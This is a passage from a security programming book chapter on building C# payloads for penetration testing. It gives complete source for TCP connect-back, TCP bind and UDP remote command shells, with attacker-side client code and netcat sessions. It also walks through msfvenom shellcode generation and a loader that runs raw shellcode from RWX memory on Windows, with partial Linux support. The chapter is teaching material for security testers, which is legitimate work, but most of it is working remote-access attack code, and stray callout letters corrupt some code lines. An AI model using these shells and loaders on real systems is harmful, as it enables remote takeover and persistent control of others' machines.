target’s machine. Binding payloads like these are most use-\nful for maintaining persistence when you can get network access.\nThe Network Stream\nWe’ll use the netcat utility available on most Unix-like operating systems\nto test our bind and connect-back payloads. Most Unix operating systems\ncome with netcat preinstalled, but if you want to use it on Windows, you\nmust download the utility with Cygwin or as an independent binary (or\nbuild from source!). First, set up netcat to listen for the connection back\nfrom our target, as shown in Listing 4-1.\n$ nc -l 4444\nListing 4-1: Listening on port 4444 using netcat\nOur connect-back payload needs to create a network stream to read\nfrom and write to. As you can see in Listing 4-2, the first lines of the pay-\nload’s Main() method create this stream for later use based on arguments\npassed to the payload.\npublic static void Main(string[] args)\n{\nusing (TcpClient client = new uTcpClient(args[0], vint.Parse(args[1])))\n{\nusing (Stream stream = client.wGetStream())\n{\nusing (StreamReader rdr = new xStreamReader(stream))\n{\nListing 4-2: Creating the stream back to the attacker using payload arguments\nThe TcpClient class constructor takes two arguments: the host to con-\nnect to as a string and the port to connect to on the host as an int. Using the\narguments passed to the payload, and assuming the first argument is the\n82 Chapter 4\nhost to connect to, we pass the arguments to the TcpClient constructor u.\nSince by default the arguments are strings, we don’t need to cast the host\nto any special type, only the port.\nThe second argument, which specifies the port to connect to, must\nbe given as an int. In order to achieve this, we use the int.Parse() static\nmethod v to convert the second argument from a string to an int. (Many\ntypes in C# have a static Parse() method that converts one type to another.)\nAfter instantiating the TcpClient, we call the client’s GetStream() method w\nand assign it to the variable stream, which we’ll read from and write to.\nFinally, we pass the stream to a StreamReader class constructor x so that we\ncan easily read the commands coming from the attacker.\nNext, we need the payload to read from the stream as long as we are\nsending commands from our netcat listener. For this we’ll use the stream\ncreated in Listing 4-2, as shown in Listing 4-3.\nwhile (true)\n{\nstring cmd = rdr.uReadLine();\nif (string.IsNullOrEmpty(cmd))\n{\nrdr.vClose();\nstream.Close();\nclient.Close();\nreturn;\n}\nif (string.wIsNullOrWhiteSpace(cmd))\ncontinue;\nstring[] split = cmd.Trim().xSplit(' ');\nstring filename = split.yFirst();\nstring arg = string.zJoin(\" \", split.{Skip(1));\nListing 4-3: Reading the command from the stream and parsing the command from the\ncommand arguments\nWithin an infinite while loop, the StreamReader ReadLine() method u\nreads a line of data from the stream, which is then assigned to the cmd vari-\nable. We determine what a line of data is based on where a newline char-\nacter appears in the data stream (\\n, or 0x0a in hexadecimal). If the string\nreturned by ReadLine() is empty or null, we close v the stream reader, the\nstream, and the client, and then return from the program. If the string con-\ntains only whitespace w, we start the loop over using continue, which brings\nus back to the ReadLine() method to start over.\nAfter reading the command to be run from the network stream, we\nseparate the arguments to the command from the command itself. For\nexample, if an attacker sends the command ls -a, the command is ls, and\nthe argument to the command is -a.\nWriting Connect-Back, Binding, and Metasploit Payloads 83\nTo separate out the arguments, we use the Split() method x to split\nthe full command on every space in the string and then return an array of\nstrings. The string array is a result of splitting the whole command string\nby the delimiter passed as the argument to the Split() method, which in\nour case is a space. Next, we use the First() method y, which is available\nin the System.Linq namespace for enumerable types such as arrays, to select\nthe first element in the string array returned by the split, and we assign it\nto the string filename to hold our base command. This should be the actual\ncommand name. Then, the Join() method z joins all but the first string in\nthe split array with a space as the joining character. We also use the LINQ\nmethod Skip() { to skip the first element in the array that was stored in\nthe filename variable. The resulting string should contain all arguments\npassed to the command. This new string is assigned to the string arg.\nRunning the Command\nNow we need to run the command and return the output to the attacker.\nAs shown in Listing 4-4, we use the Process and ProcessStartInfo classes to set\nup and run the command and then write the output back to the attacker.\ntry\n{\nProcess prc = new uProcess();\nprc.vStartInfo = new ProcessStartInfo();\nprc.StartInfo.wFileName = filename;\nprc.StartInfo.xArguments = arg;\nprc.StartInfo.yUseShellExecute = false;\nprc.StartInfo.zRedirectStandardOutput = true;\nprc.{Start();\nprc.StandardOutput.BaseStream.|CopyTo(stream);\nprc.WaitForExit();\n}\ncatch\n{\nstring error = \"Error running command \" + cmd + \"\\n\";\nbyte[] errorBytes = }Encoding.ASCII.GetBytes(error);\nstream.~Write(errorBytes, 0, errorBytes.Length);\n}\n}\n}\n}\n}\n}\nListing 4-4: Running the attacker-supplied command to the connect-back payload and\nreturning the output\nAfter instantiating a new Process class u, we assign a new ProcessStartInfo\nclass to the StartInfo property v of the Process class, which allows us to\ndefine certain options for the command so that we can get the output.\nHaving assigned the StartInfo property with a new ProcessStartInfo class,\n84 Chapter 4\nwe then assign values to the StartInfo properties: the FileName property w,\nwhich is the command we want to run, and the Arguments property x, which\ncontains any arguments for the command.\nWe also assign the UseShellExecute property y to false and the\nRedirectStandardOutput property z to true. If UseShellExecute were set to\ntrue, the command would be run in the context of another system shell,\nrather than directly by the current executable. With RedirectStandardOutput\nset to true, we can use the StandardOutput property of the Process class to\nread the command output.\nOnce the StartInfo property is set, we call Start() { on the Process to\nbegin execution of the command. While the process is running, we copy\nits standard output directly to the network stream to send to the attacker\nusing CopyTo() | on the StandardOutput stream’s BaseStream property. If an\nerror occurs during execution, Encoding.ASCII.GetBytes() } converts the\nstring Error running command <cmd> to a byte array, which is then written to\nthe network stream for the attacker using the stream’s Write() method ~.\nRunning the Payload\nRunning the payload with 127.0.0.1 and 4444 as the arguments should con-\nnect back to our netcat listener so that we can run commands on the local\nmachine and display them in the terminal, as shown in Listing 4-5.\n$ nc -l 4444\nwhoami\nbperry\nuname\nLinux\nListing 4-5: Connect-back payload connecting to the local listener and running commands\nBinding a Payload\nWhen you’re on a network with direct access to the machines that could be\nrunning your payloads, you’ll sometimes want the payloads to wait for you\nto connect to them, rather than you waiting for a connection from them.\nIn such cases, the payloads should bind locally to a port that you can simply\nconnect to with netcat so you can begin interacting with the system’s shell.\nIn the connect-back payload, we used the TcpClient class to create\na connection to the attacker. Here, instead of using the TcpClient class,\nwe’ll use the TcpListener class to listen for a connection from the attacker,\nas shown in Listing 4-6.\npublic static void Main(string[] args)\n{\nint port = uint.Parse(args[0]);\nTcpListener listener = new vTcpListener(IPAddress.Any, port);\nWriting Connect-Back, Binding, and Metasploit Payloads 85\ntry\n{\nlistener.wStart();\n}\ncatch\n{\nreturn;\n}\nListing 4-6: Starting a TcpListener on a given port via command arguments\nBefore we start listening, we convert the argument passed to the pay-\nload to an integer using int.Parse() u, which will be the port to listen on.\nThen we instantiate a new TcpListener class v by passing IPAddress.Any as the\nfirst argument to the constructor and the port we want to listen on as the\nsecond argument. The IPAddress.Any value passed as the first argument tells\nthe TcpListener to listen on any available interface (0.0.0.0).\nNext, we attempt to begin listening on the port in a try/catch block. We\ndo so because calling Start() w could throw an exception if, for example,\nthe payload is not running as a privileged user and it attempts to bind to\na port number less than 1024, or if it attempts to bind to a port already\nbound to by another program. By running Start() in a try/catch block,\nwe can catch this exception and exit gracefully if necessary. Of course, if\nStart() succeeds, the payload will begin listening for a new connection on\nthat port.\nAccepting Data, Running Commands, and Returning Output\nNow we can begin accepting data from the attacker and parsing the com-\nmands, as shown in Listing 4-7.\nuwhile (true)\n{\nusing (Socket socket = vlistener.AcceptSocket())\n{\nusing (NetworkStream stream = new wNetworkStream(socket))\n{\nusing (StreamReader rdr = new xStreamReader(stream))\n{\nywhile (true)\n{\nstring cmd = rdr.ReadLine();\nif (string.IsNullOrEmpty(cmd))\n{\nrdr.Close();\nstream.Close();\nlistener.Stop();\nbreak;\n}\nif (string.IsNullOrWhiteSpace(cmd))\ncontinue;\n86 Chapter 4\nstring[] split = cmd.Trim().zSplit(' ');\nstring filename = split.{First();\nstring arg = string.|Join(\" \", split.Skip(1));\nListing 4-7: Reading the command from the network stream and splitting the command\nfrom the arguments\nIn order to maintain persistence on the target after we disconnect from\nthe payload, we instantiate a new NetworkStream class inside a technically infi-\nnite while loop u by passing the Socket returned by listener.AcceptSocket() v\nto the NetworkStream constructor w. Then, in order to read the NetworkStream\nefficiently, within the context of a using statement, we instantiate a new\nStreamReader class x by passing the network stream to the StreamReader con-\nstructor. Once we have the StreamReader set up, we use a second infinite\nwhile loop y to continue reading commands until an empty line is sent to\nthe payload by the attacker.\nTo parse and execute commands from the stream and return the output\nto the connecting attacker, we declare a series of string variables within the\ninner while loop and split the original input on any spaces in the string z.\nNext, we take the first element from the split and assign it as the command\nto be run, using LINQ to select the first element in the array {. We then use\nLINQ again to join all the strings in the split array after the first element |\nand assign the resulting string (with the argument separated by spaces) to\nthe arg variable.\nExecuting Commands from the Stream\nNow we can set up our Process and ProcessStartInfo classes to run the com-\nmand with the arguments, if any, and capture the output, as shown in\nListing 4-8.\ntry\n{\nProcess prc = new uProcess();\nprc.StartInfo = new ProcessStartInfo();\nprc.StartInfo.vFileName = filename;\nprc.StartInfo.wArguments = arg;\nprc.StartInfo.UseShellExecute = false;\nprc.StartInfo.RedirectStandardOutput = true;\nprc.xStart();\nprc.StandardOutput.BaseStream.yCopyTo(stream);\nprc.WaitForExit();\n}\ncatch\n{\nstring error = \"Error running command \" + cmd + \"\\n\";\nbyte[] errorBytes = zEncoding.ASCII.GetBytes(error);\nstream.{Write(errorBytes, 0, errorBytes.Length);\n}\n}\n}\nWriting Connect-Back, Binding, and Metasploit Payloads 87\n}\n}\n}\n}\n}\n}\nListing 4-8: Running the command, capturing the output, and sending it back to the attacker\nAs with the connect-back payload discussed in the previous section, in\norder to run the command, we instantiate a new Process class u and assign\na new ProcessStartInfo class to the Process class’s StartInfo property. We set\nthe command filename to the FileName property v in StartInfo and set the\nArguments property w with the arguments to the command. We then set the\nUseShellExecute property to false so that our executable starts the command\ndirectly, and we set the RedirectStandardOutput property to true so we can cap-\nture the command output and return it to the attacker.\nTo start the command, we call the Process class’s Start() method x.\nWhile the process is running, we copy the standard output stream directly\nto the network stream sent to the attacker by passing it in as an argument to\nCopyTo() y, and then we wait for the process to exit. If an error occurs, we\nconvert the string Error running command <cmd> to an array of bytes using\nEncoding.ASCII.GetBytes() z. The byte array is then written to the network\nstream and sent to the attacker using the stream’s Write() method {.\nRunning the payload with 4444 as the argument will make the listener\nstart listening on port 4444 on all available interfaces. We can now use\nnetcat to connect to the listening port, as shown in Listing 4-9, and begin\nexecuting commands and returning their output.\n$ nc 127.0.0.1 4444\nwhoami\nbperry\nuname\nLinux\nListing 4-9: Connecting to the binding payload and executing commands\nusing udP to attack a network\nThe payloads discussed so far have used TCP to communicate; TCP is a state-\nful protocol that allows two computers to maintain a connection with each\nother over time. An alternative protocol is UDP, which, unlike TCP, is stateless:\nno connection is maintained between two networked machines when com-\nmunicating. Instead, communication is performed via broadcasts across the\nnetwork, with each computer listening for broadcasts to its IP address.\nAnother very important distinction between UDP and TCP is that TCP\nattempts to ensure that packets sent to a machine will reach that machine\nin the same order in which they were sent. In contrast, UDP packets may be\nreceived in any order, or not at all, which makes UDP less reliable than TCP.\n88 Chapter 4\nUDP does, however, have some benefits. For one, because it doesn’t try\nto ensure that computers receive the packets it sends, it’s blazingly fast. It’s\nalso not as commonly scrutinized on networks as TCP is, with some firewalls\nconfigured to handle TCP traffic only. This makes UDP is a great protocol\nto use when attacking a network, so let’s see how to write a UDP payload to\nexecute a command on a remote machine and return the results.\nInstead of using the TcpClient or TcpListener classes to achieve a connec-\ntion and communicate, as in previous payloads, we’ll use the UdpClient and\nSocket classes over UDP. Both the attacker and target machines will need to\nlisten for UDP broadcasts as well as maintain a socket to broadcast data to\nthe other computer.\nThe Code for the Target’s Machine\nThe code to run on the target machine will listen on a UDP port for com-\nmands, execute those commands, and return the output to the attacker via\na UDP socket, as shown in Listing 4-10.\npublic static void Main(string[] args)\n{\nint lport = int.uParse(args[0]);\nusing (UdpClient listener = new vUdpClient(lport))\n{\nIPEndPoint localEP = new wIPEndPoint(IPAddress.Any, lport);\nstring cmd;\nbyte[] input;\nListing 4-10: First five lines of the Main() method for the target code\nBefore sending and receiving data, we set up a variable for the port to\nlisten on. (To keep things simple, we’ll have both the target and attacker\nmachines listen for data on the same port, but this assumes we are attack-\ning a separate virtual machine). As shown in Listing 4-10, we use Parse() u\nto turn the string passed as an argument into an integer, and then we pass\nthe port to the UdpClient constructor v to instantiate a new UdpClient. We\nalso to set up the IPEndPoint class w, which encompasses a network interface\nand a port, by passing in IPAddress.Any as the first argument and the port to\nlisten on as the second argument. We assign the new object to the localEP\n(local endpoint) variable. Now we can begin receiving data from network\nbroadcasts.\nThe Main while Loop\nAs shown in Listing 4-11, we begin with a while loop that loops continuously\nuntil an empty string is received from the attacker.\nwhile (true)\n{\ninput = listener.uReceive(ref localEP);\ncmd = vEncoding.ASCII.GetString(input, 0, input.Length);\nWriting Connect-Back, Binding, and Metasploit Payloads 89\nif (string.IsNullOrEmpty(cmd))\n{\nlistener.Close();\nreturn;\n}\nif (string.IsNullOrWhiteSpace(cmd))\ncontinue;\nstring[] split = cmd.Trim().wSplit(' ');\nstring filename = split.xFirst();\nstring arg = string.yJoin(\" \", split.Skip(1));\nstring results = string.Empty;\nListing 4-11: Listening for UDP broadcasts with commands and parsing the command from\nthe arguments\nIn this while loop, we call listener.Receive(), passing in the IPEndPoint\nclass we instantiated. Receiving data from the attacker, Receive() u fills\nthe localEP Address property with the attacking host’s IP address and other\nconnection information, so we can use this data later when responding.\nReceive() also blocks execution of the payload until a UDP broadcast is\nreceived.\nOnce a broadcast is received, Encoding.ASCII.GetString() v converts the\ndata to an ASCII string. If the string is null or empty, we break from the\nwhile loop and let the payload process finish and exit. If the string consists\nonly of whitespace, we restart the loop using continue to receive a new com-\nmand from the attacker. Once we’ve ensured that the command isn’t an\nempty string or whitespace, we split it on any spaces w (same as we did in\nthe TCP payloads) and then separate the command from the string array\nreturned by the split x. We then create the argument string by joining all\nthe strings in the split array after the first array element y.\nExecuting the Command and Returning the Result to the Sender\nNow we can execute the command and return the result to the sender via a\nUDP broadcast, as shown in Listing 4-12.\ntry\n{\nProcess prc = new Process();\nprc.StartInfo = new ProcessStartInfo();\nprc.StartInfo.FileName = filename;\nprc.StartInfo.Arguments = arg;\nprc.StartInfo.UseShellExecute = false;\nprc.StartInfo.RedirectStandardOutput = true;\nprc.Start();\nprc.WaitForExit();\nresults = prc.StandardOutput.uReadToEnd();\n}\ncatch\n{\nresults = \"There was an error running the command: \" + filename;\n90 Chapter 4\n}\nusing (Socket sock = new vSocket(AddressFamily.InterNetwork,\nSocketType.Dgram, ProtocolType.Udp))\n{\nIPAddress sender = wlocalEP.Address;\nIPEndPoint remoteEP = new xIPEndPoint(sender, lport);\nbyte[] resultsBytes = Encoding.ASCII.GetBytes(results);\nsock.ySendTo(resultsBytes, remoteEP);\n}\n}\n}\n}\n}\n}\nListing 4-12: Executing the command received and broadcasting the output back to\nthe attacker\nAs with the previous payloads, we use the Process and ProcessStartInfo\nclasses to execute the command and return the output. We set up the\nStartInfo property with the filename and arg variables we used to store the\ncommand and command arguments, respectively, and we also set the\nUseShellExecute property and the RedirectStandardOutput property. We begin\nthe new process by calling the Start() method and then wait until the pro-\ncess has finished execution by calling WaitForExit(). Once the command\nfinishes, we call the ReadToEnd() method u on the StandardOutput stream\nproperty of the process and save the output to the results string declared\nearlier. If an error occurred during process execution, we instead assign the\nstring There was an error running the command: <cmd> to the results variable.\nNow we need to set up the socket that will be used to return the\ncommand output to the sender. We’ll broadcast the data using a UDP\nsocket. Using the Socket class, we instantiate a new Socket v by passing\nenumeration values as the arguments to the Socket constructor. The first\nvalue, AddressFamily.InterNetwork, says we’ll be communicating using IPv4\naddresses. The second value, SocketType.Dgram, means that we’ll be commu-\nnicating using UDP datagrams (the D in UDP) instead of TCP packets. The\nthird and final value, ProtocolType.Udp, tells the socket that we’ll be using\nUDP to communicate with the remote host.\nAfter creating the socket to be used for communication, we assign a new\nIPAddress variable with the value of the localEP.Address property w, which was\npreviously filled with the attacker’s IP address upon receiving data on our\nUDP listener. We create a new IPEndPoint x with the IPAddress of the attacker\nand the listening port that was passed as the argument to the payload.\nOnce we have the socket set up and we know where we are returning\nour command output, Encoding.ASCII.GetBytes() converts the output to a\nbyte array. We use SendTo() y on the socket to broadcast the data back to\nthe attacker by passing the byte array containing the command output\nas the first argument and passing the sender’s endpoint as the second\nargument. Finally, we iterate back to the top of the while loop to read in\nanother command.\nWriting Connect-Back, Binding, and Metasploit Payloads 91\nThe Attacker’s Code\nIn order for this attack to work, the attacker must be able to listen to and\nsend UDP broadcasts to the correct host. Listing 4-13 shows the first bit of\ncode to set up a UDP listener.\nstatic void Main(string[] args)\n{\nint lport = int.uParse(args[1]);\nusing (UdpClient listener = new vUdpClient(lport))\n{\nIPEndPoint localEP = new wIPEndPoint(IPAddress.Any, lport);\nstring output;\nbyte[] bytes;\nListing 4-13: Setting up the UDP listener and other variables for the attacker-side code\nAssuming that this code will take as arguments the host to send com-\nmands to and the port to listen on, we pass the port to listen on to Parse() u\nin order to convert the string into an integer, and then we pass the resulting\ninteger to the UdpClient constructor v to instantiate a new UdpClient class.\nWe then pass the listening port to the IPEndPoint class constructor, along\nwith the IPAddress.Any value to instantiate a new IPEndPoint class w. Once the\nIPEndPoint is set up, we declare the variables output and bytes for later use.\nCreating the Variables to Send the UDP Broadcasts\nListing 4-14 shows how to create the variables to be used to send the UDP\nbroadcasts.\nusing (Socket sock = new uSocket(AddressFamily.InterNetwork,\nSocketType.Dgram,\nProtocolType.Udp))\n{\nIPAddress addr = vIPAddress.Parse(args[0]);\nIPEndPoint addrEP = new wIPEndPoint(addr, lport);\nListing 4-14: Creating the UDP socket and endpoint to communicate with\nTo begin, we instantiate a new Socket class u within the context of a\nusing block. The enumeration values passed to Socket tell the socket that\nwe’ll be using IPv4 addressing, datagrams, and UDP to communicate via\nbroadcasts. We instantiate a new IPAddress with IPAddress.Parse() v to con-\nvert the first argument passed to the code to an IPAddress class. We then\npass the IPAddress object and the port on which the target’s UDP listener\nwill be listening to the IPEndPoint constructor in order to instantiate a new\nIPEndPoint class w.\nCommunicating with the Target\nListing 4-15 shows how we can now send data to and receive data from the\ntarget.\n92 Chapter 4\nConsole.WriteLine(\"Enter command to send, or a blank line to quit\");\nwhile (true)\n{\nstring command = uConsole.ReadLine();\nbyte[] buff = Encoding.ASCII.GetBytes(command);\ntry\n{\nsock.vSendTo(buff, addrEP);\nif (string.IsNullOrEmpty(command))\n{\nsock.Close();\nlistener.Close();\nreturn;\n}\nif (string.IsNullOrWhiteSpace(command))\ncontinue;\nbytes = listener.wReceive(ref localEP);\noutput = Encoding.ASCII.GetString(bytes, 0, bytes.Length);\nConsole.WriteLine(output);\n}\ncatch (Exception ex)\n{\nConsole.WriteLine(\"Exception{0}\", ex.Message);\n}\n}\n}\n}\n}\nListing 4-15: Main logic to send and receive data to and from the target’s UDP listener\nAfter printing some friendly help text on how to use this script, we begin\nsending commands to the target in a while loop. First, Console.ReadLine() u\nreads in a line of data from standard input, which will become the com-\nmand to send to the target’s machine. Then, Encoding.ASCII.GetBytes() con-\nverts this string into a byte array so that we can send it over the network.\nNext, within a try/catch block, we attempt to send the byte array using\nSendTo() v, passing in the byte array and the IP endpoint to send the data\nto. After sending the command string, we return out of the while loop if\nthe string read from standard input was empty because we built the same\nlogic into the target code. If the string is not empty, but is only whitespace,\nwe return to the beginning of the while loop. Then we call Receive() w on\nthe UDP listener to block execution until the command output is received\nfrom the target, at which point Encoding.ASCII.GetString() converts the bytes\nreceived to a string that is then written to the attacker’s console. If an error\noccurs, we print an exception message to the screen.\nWriting Connect-Back, Binding, and Metasploit Payloads 93\nAs shown in Listing 4-16, after starting the payload on a remote machine,\npassing 4444 as the only argument to the payload, and starting the receiver\non the attacker’s machine, we should be able to execute commands and\nreceive output from the target.\n$ /tmp/attacker.exe 192.168.1.31 4444\nEnter command to send, or a blank line to quit\nwhoami\nbperry\npwd\n/tmp\nuname\nLinux\nListing 4-16: Communicating with the target machine over UDP in order to run arbitrary\ncommands\nrunning x86 and x86-64 Metasploit Payloads from C#\nThe Metasploit Framework exploitation toolset, begun by HD Moore and\nnow developed by Rapid7, has become the de facto penetration testing and\nexploit development framework for security professionals. Because it’s written\nin Ruby, Metasploit is cross-platform and will run on Linux, Windows, OS X,\nand a slew of other operating systems. As of this writing, there are more than\n1,300 free Metasploit exploits written in the Ruby programming language.\nIn addition to its collection of exploits, Metasploit contains many\nlibraries designed to make exploit development quick and generally pain-\nless. For example, as you’ll soon see, you can use Metasploit to help create\na cross-platform .NET assembly to detect your operating system type and\narchitecture and to run shellcode against it.\nSetting Up Metasploit\nAs of this writing, Rapid7 develops Metasploit on GitHub (https://github\n.com/rapid7/metasploit-framework/). On Ubuntu, use git to clone the master\nMetasploit repository to your system, as shown in Listing 4-17.\n$ sudo apt-get install git\n$ git clone https://github.com/rapid7/metasploit-framework.git\nListing 4-17: Installing git and cloning the Metasploit Framework\nnote I recommend using Ubuntu when developing the next payload in this chapter. Of\ncourse, testing will also need to be done on Windows to ensure your OS detection and\npayloads work across both platforms.\nInstalling Ruby\nThe Metasploit Framework requires Ruby. If, after reading the Metasploit\ninstall instructions online, you find that you need a different version of\n94 Chapter 4\nRuby installed on your Linux system, use RVM, the Ruby Version Manager\n(http://rvm.io/) to install it alongside any existing version of Ruby. Install\nthe RVM maintainer’s GNU Privacy Guard (GPG) key and then install\nRVM on Ubuntu, as shown in Listing 4-18.\n$ curl -sSL https://rvm.io/mpapis.asc | gpg --import -\n$ curl -sSL https://get.rvm.io | bash -s stable\nListing 4-18: Installing RVM\nOnce RVM is installed, determine which version of Ruby the Metasploit\nFramework requires by viewing the .ruby-version file at the root of the\nMetasploit Framework, as shown in Listing 4-19.\n$ cd metasploit-framework/\n$ cat .ruby-version\n2.1.5\nListing 4-19: Printing the contents of the  .ruby-version file at the root of the Metasploit\nFramework\nNow run the rvm command to compile and install the correct version of\nRuby, as shown in Listing 4-20. This may take several minutes, depending\non your internet and CPU speed.\n$ rvm install 2.x\nListing 4-20: Installing the version of Ruby required by Metasploit\nOnce your Ruby install completes, set your bash environment to see it,\nas shown in Listing 4-21.\n$ rvm use 2.x\nListing 4-21: Setting the installed version of Ruby as the default\nInstalling Metasploit Dependencies\nMetasploit uses the bundler gem (a Ruby package) to manage dependencies.\nChange to the current Metasploit Framework git checkout directory on\nyour machine and run the commands shown in Listing 4-22 to install the\ndevelopment libraries needed to build some of the gems required by the\nMetasploit Framework.\n$ cd metasploit-framework/\n$ sudo apt-get install libpq-dev libpcap-dev libxslt-dev\n$ gem install bundler\n$ bundle install\nListing 4-22: Installing Metasploit dependencies\nWriting Connect-Back, Binding, and Metasploit Payloads 95\nOnce all dependencies have been installed, you should be able to start\nthe Metasploit Framework, as shown in Listing 4-23.\n$ ./msfconsole -q\nmsf >\nListing 4-23: Starting Metasploit successfully\nWith msfconsole started successfully, we can begin using the other tools\nin the framework to generate payloads.\nGenerating Payloads\nWe’ll use the Metasploit tool msfvenom to generate raw assembly payloads\nto open programs on Windows or run commands on Linux. For example,\nListing 4-24 shows how commands sent to msfvenom would generate an x86-64\n(64-bit) payload for Windows that will pop up the calc.exe Windows calcula-\ntor on the currently displayed desktop. (To see the msfvenom tool’s full list of\noptions, run msfvenom --help from the command line.)\n$ ./msfvenom -p windows/x64/exec -f csharp CMD=calc.exe\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo Arch selected, selecting Arch: x86_64 from the payload\nNo encoder or badchars specified, outputting raw payload\nbyte[] buf = new byte[276] {\n0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,\n--snip--\n0x63,0x2e,0x65,0x78,0x65,0x00 };\nListing 4-24: Running msfvenom to generate a raw Windows payload that runs calc .exe\nHere we pass in windows/x64/exec as the payload, csharp as the payload\nformat, and the payload option CMD=calc.exe. You might also pass in some-\nthing like linux/x86/exec with CMD=whoami to generate a payload that, when\nlaunched on a 32-bit Linux system, runs the command whoami.\nExecuting Native Windows Payloads as Unmanaged Code\nMetasploit payloads are generated in 32- or 64-bit assembly code—called\nunmanaged code in the .NET world. When you compile C# code into a DLL\nor executable assembly, that code is referred to as managed code. The differ-\nence between the two is that the managed code requires a .NET or Mono\nvirtual machine in order to run, whereas the unmanaged code can be run\ndirectly by the operating system.\nTo execute unmanaged assembly code within a managed environment,\nwe’ll use .NET’s P/Invoke to import and run the VirtualAlloc() function\nfrom the Microsoft Windows kernel32.dll. This lets us allocate the readable,\nwritable, and executable memory required, as shown in Listing 4-25.\nclass MainClass\n{\n[uDllImport(\"kernel32\")]\n96 Chapter 4\nstatic extern IntPtr vVirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);\n[wUnmanagedFunctionPointer(CallingConvention.StdCall)]\ndelegate void xWindowsRun();\nListing 4-25: Importing the VirtualAlloc() kernel32.dll function and defining a Windows-specific delegate\nAt v, we import VirtualAlloc() from kernel32.dll. The VirtualAlloc()\nfunction takes four arguments of type IntPtr, which is a C# class that makes\npassing data between managed and unmanaged code much simpler. At u,\nwe use the C# attribute DllImport (an attribute is like an annotation in Java\nor a decorator in Python) to tell the virtual machine to look for this func-\ntion in the kernel32.dll library at runtime. (We’ll use the DllImport attribute\nto import functions from libc when executing Linux payloads.) At x, we\ndeclare the delegate WindowsRun(), which has an UnmanagedFunctionPointer\nattribute w that tells the Mono/.NET virtual machine to run this delegate\nas an unmanaged function. By passing CallingConvention.StdCall to the\nUnmanagedFunctionPointer attribute, we tell the Mono/.NET virtual machine\nto call VirtualAlloc() using the StdCall Windows calling convention.\nFirst we need to write a Main() method to execute the payload according\nto the target system architecture, as shown in Listing 4-26.\npublic static void Main(string[] args)\n{\nOperatingSystem os = uEnvironment.OSVersion;\nbool x86 = v(IntPtr.Size == 4);\nbyte[] payload;\nif (os.Platform == wPlatformID.Win32Windows || os.Platform == PlatformID.Win32NT)\n{\nif (!x86)\npayload = new byte[] { [... FULL x86-64 PAYLOAD HERE ...] };\nelse\npayload = new byte[] { [... FULL x86 PAYLOAD HERE ...] };\nIntPtr ptr = xVirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);\nyMarshal.Copy(payload, 0, ptr, payload.Length);\nWindowsRun r = (WindowsRun)zMarshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));\nr();\n}\n}\nListing 4-26: Small C# class wrapping two Metasploit payloads\nTo determine the target operating system, we capture the variable\nEnvironment.OSVersion u, which has a Platform property that identifies the\ncurrent system (as used in the if statement). To determine the target archi-\ntecture, we compare the size of an IntPtr to the number 4 v because on\na 32-bit system, a pointer is 4 bytes long, but on a 64-bit system, it’s 8 bytes\nlong. We know that if the IntPtr size is 4, we are on a 32-bit system; other-\nwise, we assume the system is 64-bit. We also declare a byte array called\npayload to hold our generated payload.\nWriting Connect-Back, Binding, and Metasploit Payloads 97\nNow we can set up our native assembly payload. If the current operat-\ning system matches a Windows PlatformID w (a list of known platforms and\noperating system versions), we assign a byte array to the payload variable\naccording to the system’s architecture.\nTo allocate the memory required to execute the raw assembly code, we\npass four arguments to VirtualAlloc() x. The first argument is IntPtr.Zero,\nwhich tells VirtualAlloc() to allocate the memory at the first viable loca-\ntion. The second argument is the amount of memory to allocate, which will\nequal the length of the current payload. This argument is cast to an IntPtr\nclass that the unmanaged function understands in order for it to allocate\nenough memory to fit our payload.\nThe third argument is a magic value defined in kernel32.dll that maps\nto the MEM_COMMIT option, telling VirtualAlloc() to allocate the memory right\naway. This argument defines the mode in which the memory should be\nallocated. Finally, 0x40 is a magic value defined by kernel32.dll that maps to\nthe RWX (read, write, and execute) mode that we want. The VirtualAlloc()\nfunction will return a pointer to our newly allocated memory so we know\nwhere our allocated memory region begins.\nNow Marshal.Copy() y copies our payload directly into the allocated mem-\nory space. The first argument passed to Marshal.Copy() is the byte array we\nwant to copy into the allocated memory. The second is the index in the byte\narray to begin copying at, and the third is where to begin copying to (using\nthe pointer returned by the VirtualAlloc() function). The last argument\nis how many bytes from the byte array we want to copy into the allocated\nmemory (all).\nNext, we reference the assembly code as an unmanaged function\npointer using the WindowsRun delegate we defined at the top of the MainClass.\nWe use the Marshal.GetDelegateForFunctionPointer() method z to create a new\ndelegate by passing the pointer to the beginning of our assembly code and the\ntype of delegate as the first and second arguments, respectively. We cast the\ndelegate returned by this method to our WindowsRun delegate type and then\nassign it to a new variable of the same WindowsRun type. Now all that’s left is\nto call this delegate as if it were a function and execute the assembly code\nwe copied into memory.\nExecuting Native Linux Payloads\nIn this section, we look at how to define payloads that can be compiled once\nand run on both Linux and Windows. But first we need to import a few\nfunctions from libc and define our Linux unmanaged function delegate, as\nshown in Listing 4-27.\n[DllImport(\"libc\")]\nstatic extern IntPtr mprotect(IntPtr ptr, IntPtr length, IntPtr protection);\n[DllImport(\"libc\")]\nstatic extern IntPtr posix_memalign(ref IntPtr ptr, IntPtr alignment, IntPtr size);\n[DllImport(\"libc\")]\n98 Chapter 4\nstatic extern void free(IntPtr ptr);\n[UnmanagedFunctionPointer(uCallingConvention.Cdecl)]\ndelegate void vLinuxRun();\nListing 4-27: Setting up the payload to run the generated Metasploit payloads\nWe add the lines shown in Listing 4-27 at the top of the MainClass\nnear our Windows function import. We import three functions from\nlibc—mprotect(), posix_memalign(), and free()—and define a new delegate\ncalled LinuxRun v. This has the UnmanagedFunctionPointer attribute, like our\nWindowsRun delegate. However, instead of passing CallingConvention.StdCall\nas we did in Listing 4-25, we pass CallingConvention.Cdecl u, because cdecl\nis the calling convention of native functions in a Unix-like environment.\nIn Listing 4-28, we now add an else if statement to our Main() method,\nfollowing the if statement that tests whether we are on a Windows machine\n(refer to w in Listing 4-26).\nelse if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform == 128)\n{\nif (!x86)\npayload = new byte[] { [... X86-64 LINUX PAYLOAD GOES HERE ...] };\nelse\npayload = new byte[] { [... X86 LINUX PAYLOAD GOES HERE ...] };\nListing 4-28: Detecting the platform and assigning the appropriate payload\nThe original PlatformID enumeration from Microsoft did not include\nvalues for non-Windows 